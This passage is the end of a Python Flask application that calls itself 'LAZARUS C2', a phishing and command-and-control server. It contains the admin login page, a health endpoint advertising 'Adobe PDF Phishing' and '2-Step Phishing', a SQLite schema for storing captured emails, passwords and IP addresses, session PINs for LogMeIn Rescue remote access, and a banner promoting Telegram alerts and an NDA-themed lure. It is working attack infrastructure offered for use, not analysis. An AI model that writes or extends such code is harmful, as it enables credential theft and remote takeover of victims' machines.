        p{color:#6c7293;text-align:center;margin-bottom:24px;font-size:12px}
        input{width:100%;padding:14px;margin:10px 0;background:#0a0c10;border:2px solid #2a2f3e;border-radius:12px;color:#ea1c24;font-family:'Courier New',monospace;font-size:14px;box-sizing:border-box}
        input:focus{outline:none;border-color:#ea1c24}
        button{width:100%;padding:14px;background:#ea1c24;color:#0a0c10;border:none;border-radius:12px;font-weight:bold;cursor:pointer;font-size:14px;font-family:'Courier New',monospace}
        button:hover{background:#ff3333}
    </style>
    </head>
    <body>
        <div class="card">
            <h2>🎯 LAZARUS C2</h2>
            <p>Authorized Personnel Only</p>
            <form method="POST">
                <input type="password" name="p" placeholder="Enter admin password" required autofocus>
                <button type="submit">ACCESS DASHBOARD</button>
            </form>
        </div>
    </body>
    </html>
    '''

@app.route('/health')
def health():
    return jsonify({
        "status": "operational",
        "version": "LAZARUS C2 2026",
        "style": "Adobe PDF Phishing",
        "features": ["PDF Simulation", "2-Step Phishing", "Auto PIN Generation", "Admin Panel"],
        "api_token_configured": bool(LOGMEIN_API_TOKEN)
    })

# ====================================================================================================
# DATABASE
# ====================================================================================================
def init_db():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS creds 
                 (id INTEGER PRIMARY KEY AUTOINCREMENT, step INTEGER, email TEXT, 
                  password TEXT, ip TEXT, ts TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS sessions
                 (id INTEGER PRIMARY KEY AUTOINCREMENT, session_id TEXT, pin TEXT, 
                  ref TEXT, ip TEXT, status TEXT, ts TEXT)''')
    conn.commit()
    conn.close()

init_db()

# ====================================================================================================
# MAIN
# ====================================================================================================
if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    print(f"""
╔══════════════════════════════════════════════════════════════════════╗
║                                                                      ║
║   🎯 LAZARUS C2 v2026 - AUTOMATIC LOGMEIN RESCUE                   ║
║                                                                      ║
║   ✅ Auto PIN Generation (No Manual)                                ║
║   ✅ NDA/Strategic Update Theme                                    ║
║   ✅ 2-Step Phishing                                               ║
║   ✅ Full Admin Dashboard                                          ║
║   ✅ Telegram Alerts                                               ║
║                                                                      ║
║   Serving on http://0.0.0.0:{port}                                   ║
║   Admin:  http://localhost:{port}/admin                             ║
║                                                                      ║
╚══════════════════════════════════════════════════════════════════════╝
""")
    app.run(host='0.0.0.0', port=port, debug=False)
